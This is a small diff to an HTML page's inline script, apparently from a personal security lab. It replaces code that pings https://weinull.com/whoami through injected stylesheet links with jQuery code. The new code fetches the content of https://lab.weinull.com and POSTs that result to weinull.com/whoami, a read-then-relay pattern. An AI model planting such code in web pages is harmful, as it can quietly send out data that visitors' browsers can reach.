@@ -10,23 +10,10 @@
 <body>
 
 <script type="application/javascript">
-    for (i = 0; i < 2; i++) {
-        addCssByLink('https://weinull.com/whoami?a=' + i.toString())
-    }
+    $.get("https://lab.weinull.com", function (result) {
+        $.post("https://weinull.com/whoami", {"result": result});
+    });
 
-    function addCssByLink(url) {
-        var doc = document;
-        var link = doc.createElement("link");
-        link.setAttribute("rel", "stylesheet");
-        link.setAttribute("type", "text/css");
-        link.setAttribute("href", url);
-
-        var heads = doc.getElementsByTagName("head");
-        if (heads.length)
-            heads[0].appendChild(link);
-        else
-            doc.documentElement.appendChild(link);
-    }
 </script>
 
 <script type="application/javascript" src="/static/js/bootstrap.min.js"></script>
